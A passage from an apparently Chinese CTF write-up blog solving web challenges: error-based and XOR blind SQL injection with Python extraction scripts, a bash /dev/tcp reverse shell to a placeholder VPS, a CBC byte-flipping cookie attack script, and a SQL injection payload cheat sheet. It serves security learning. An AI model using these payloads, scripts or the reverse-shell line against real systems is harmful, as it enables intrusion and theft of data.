href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p><strong>考察点：报错注入</strong></p><p>先在admin_user测试，发现双引号时admin_passwd报错，于是在admin_passwd处利用报错注入：</p><p>比较实用的几种报错注入方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and updatexml(1,concat('~',(your_payload),'~'),3) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (your_payload) a) ); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(((your_payload)),<span class="keyword">floor</span> (<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>注意：超过一行时用 <code>payload LIMIT 0,1</code>逐个查询</strong></p><p><code>payload：admin_name=admin&amp;admin_passwd=123456&quot; and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3) #</code></p><p><strong>PS：以上三条都能打</strong></p><h2 id="PHP-encrypt-1"><a href="#PHP-encrypt-1" class="headerlink" title="PHP_encrypt_1"></a>PHP_encrypt_1</h2><p>加密脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);<span class="comment">//$klen=32</span></span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen) <span class="comment">//如果$x=32</span></span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>意思就是生成与明文长度相等的密钥流，然后对应位加密。</p><p>解密脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($crypt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$crypt = base64_decode($crypt);</span><br><span class="line">$len = strlen($crypt);</span><br><span class="line">$key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">$klen = strlen($key);</span><br><span class="line">$char = <span class="string">""</span>;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen) <span class="comment">//如果$x=32</span></span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$len;$i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(ord($crypt[$i]) &gt;= ord($char[$i]))&#123;</span><br><span class="line">$str .= chr((ord($crypt[$i])-ord($char[$i])));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ord($crypt[$i]) &lt; ord($char[$i]))&#123;</span><br><span class="line">$str .= chr((ord($crypt[$i])+<span class="number">128</span>-ord($char[$i])));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">decrypt(<span class="string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span>);</span><br></pre></td></tr></table></figure><p><strong>PS：题目给出了密文</strong></p><h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p><strong>考察点：union_md5()、命令执行反弹shell</strong></p><p>在响应头中发现Hint：</p><p><img src="https://i.loli.net/2019/09/03/I4aGoQj7XtukmH9.png" alt="Snipaste_2019-09-03_08-28-47.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造语句：<code>submit=Login&amp;username=admin&#39; union select 1,md5(1)#&amp;password=1</code></p><p>然后进入命令执行页面，输入反弹shell语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> VPS：</span></span><br><span class="line">nc -lvp 6666</span><br><span class="line"><span class="meta">#</span><span class="bash"> 命令执行点：</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h2><p><strong>考察点：各种过滤、异或盲注</strong></p><p>人工fuzz，发现过滤了空格、逗号、and、or、–+、union。</p><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">()</span><br><span class="line">%0a</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>这里发现可以用括号，另外需要注意or被过滤，这表示inf<strong>or</strong>mation_schema已经不能用了，最重要的是我们不能用 substr(“payload” from f<strong>or</strong>)来截取字符串了。</p><p>这里我们需要用到<code>ascii()</code>函数的一个特性：<code>ascii()</code><strong>在处理字符串时会返回第一个字符的ascii码</strong>，这样我们就能fuzz出每一个字符。</p><p>在编写脚本前先观察页面回显：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;^(0)^1#</span><br><span class="line">&amp;password&#x3D;123456</span><br><span class="line">&amp;submit&#x3D;Log In</span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiteM.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;^(1)^1#</span><br><span class="line">&amp;password&#x3D;123456</span><br><span class="line">&amp;submit&#x3D;Log In</span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiZht.png" alt=""></p><p>观察发现语句为假返回<code>password error!</code>，语句为真时返回<code>username does not exist!</code></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">关键在于：异或判断 &amp; ascii()处理字符串返回第一个字符的ascii值</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">character = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">url = <span class="string">"http://123.206.31.85:49167/"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        payload = <span class="string">"(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)"</span> % (i, ord(c))</span><br><span class="line">        username = <span class="string">"admin'^(%s)^1#"</span> % payload  <span class="comment"># 1=&gt;username does not exist!  0=&gt;password error!</span></span><br><span class="line">        password = <span class="number">123456</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"username does not exist!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><h2 id="login4-SKCTF"><a href="#login4-SKCTF" class="headerlink" title="login4(SKCTF)"></a>login4(SKCTF)</h2><p><strong>考察点：CBC字节翻转攻击_脚本编写</strong></p><p> 之前一直以为很难懂，原来只是分组密码里的密文链接模式2333。</p><h3 id="CBC加解密流程"><a href="#CBC加解密流程" class="headerlink" title="CBC加解密流程"></a>CBC加解密流程</h3><p>加密的步骤简单来说，首先把明文分组(通常16字节一组)，然后与上一组的密文异或，再用密钥加密输出即可。</p><p>这里注意第一组用初始向量异或。</p><p><img src="https://upload-images.jianshu.io/upload_images/6949366-5e79b4a4e6495c2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/601" alt=""></p><p>对应的解密步骤，把密文分组，先用密钥解密，再与上一组密文异或得到明文。</p><p><img src="https://upload-images.jianshu.io/upload_images/6949366-d69c0869465af6de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/601" alt=""></p><h3 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h3><p>这类题目一般初始向量IV和加密的密文可控，然后题目实现一个加密和解密的过程，要求解密后的明文有指定的内容。(当然一开始是没有的)</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="username" type="text" class="input username" value="Username" οnfοcus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="password" type="password" class="input password" value="Password" οnfοcus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里要求username为admin，但是又不能输入admin，这里就可以利用CBC字节翻转攻击。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">source_plain = decrypt(cypher, key) ^ pr_cypher</span></span><br><span class="line"><span class="string">target_plain = decrypt(cypher, key) ^ new_pr_cypher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">decrypt(cypher, key) = source_plain ^ pr_cypher</span></span><br><span class="line"><span class="string">decrypt(cypher, key) = targer_plain ^ new_pr_cypher</span></span><br><span class="line"><span class="string">source_plain ^ pr_cypher = targer_plain ^ new_pr_cypher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*** new_pr_cypher = souce_plain ^ target_plain ^ pr_cypher ***</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST：username=zdmin&amp;password=12345</span></span><br><span class="line"><span class="comment"># s:2:&#123;s:8:"userna</span></span><br><span class="line"><span class="comment"># me";s:5:"zdmin"; # 第2组 第10字节</span></span><br><span class="line"><span class="comment"># s:8:"password";s</span></span><br><span class="line"><span class="comment"># :3:"12345";&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改上一组的密文，控制本组明文输出</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cypher_payload</span><span class="params">()</span>:</span></span><br><span class="line">    cypher = <span class="string">'ZAF4kXCUawL7i4ofBhE%2Bi5GTeMY4aHhzY8x%2FQKy%2FDdI5nJK6gHXbOMugUFTL6pG7gQBNvtsT6o0nq6Pd3MQeuw%3D%3D'</span>  <span class="comment"># 填写第一次提交获得的密文</span></span><br><span class="line">    cypher = base64.b64decode(urllib.unquote(cypher))</span><br><span class="line">    new_cypher = cypher[<span class="number">0</span>:<span class="number">9</span>] + chr(ord(<span class="string">'a'</span>) ^ ord(<span class="string">'z'</span>) ^ ord(cypher[<span class="number">9</span>])) + cypher[<span class="number">10</span>:]</span><br><span class="line">    new_cypher = urllib.quote(base64.b64encode(new_cypher))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"new_cypher:"</span> + new_cypher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改初始向量(上一组的上一组)，保持上一组解密后明文不变</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iv_payload</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = <span class="string">'+BHIbc7b6bOgCeaqeTLFQm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ=='</span>  <span class="comment"># 填写提交后所得的无法反序列化的明文</span></span><br><span class="line">    iv = <span class="string">'WGg7JCcty4UxRBR9L3EVEw%3D%3D'</span>  <span class="comment"># 填写第一次提交获得的初始向量</span></span><br><span class="line">    <span class="comment"># cipher = urllib.unquote(cipher)</span></span><br><span class="line">    cipher = base64.b64decode(cipher)</span><br><span class="line">    iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">    right = <span class="string">'a:2:&#123;s:8:"userna'</span>  <span class="comment"># 被破坏的分组</span></span><br><span class="line">    newIv = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        newIv += chr(ord(right[i]) ^ ord(iv[i]) ^ ord(cipher[i]))  <span class="comment"># 这一步相当于把原来iv中不匹配的部分修改过来</span></span><br><span class="line">    <span class="keyword">print</span> urllib.quote(base64.b64encode(newIv))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先走第一个函数构造上一组的密文，再走第二个函数构造上一组的上一组的密文(本题的初始化向量)</span></span><br><span class="line">cypher_payload()</span><br><span class="line">iv_payload()</span><br></pre></td></tr></table></figure><p>不多解释了，脚本写得很清楚。</p><p>先获取zdmin加密后的密文和初始向量IV：</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiHwL.png" alt=""></p><p>利用脚本获取new_cipher使其解密后zdmin变为admin：</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpirAW.png" alt=""></p><p>填入new_cipher，获取返回的因为第一组被破坏而无法反序列化的明文：</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpi5Fw.png" alt=""></p><p>利用脚本获取new_iv，使被修改的第一组密文正常解密：</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiAJR.png" alt=""></p><p>向cookie中添加new_iv和new_cipher获取flag。</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiM48.png" alt=""></p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><strong>考察点：变量覆盖</strong></p><p>这里我老是忘记，$b = file_get_contents($_GET[‘a’])，当a=php://input，然后post传1，$b就会等于1。</p><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查库名---(select group_concat(schema_name) from information_schema.schemata)</span><br><span class="line"></span><br><span class="line">查表名---(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;schema_name&#39;)</span><br><span class="line"></span><br><span class="line">查字段---(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;table_name&#39;)</span><br><span class="line"></span><br><span class="line">查flag--- (select column_name from table_name)</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and updatexml(1,concat('~',(your_payload),'~'),3) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (your_payload) a) ); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(((your_payload)),<span class="keyword">floor</span> (<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>注意：超过一行时用 <code>payload LIMIT 0,1</code>逐个查询</strong></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and case when substring((<span class="keyword">select</span> flag <span class="keyword">from</span> flag) <span class="keyword">from</span> %d <span class="keyword">for</span> <span 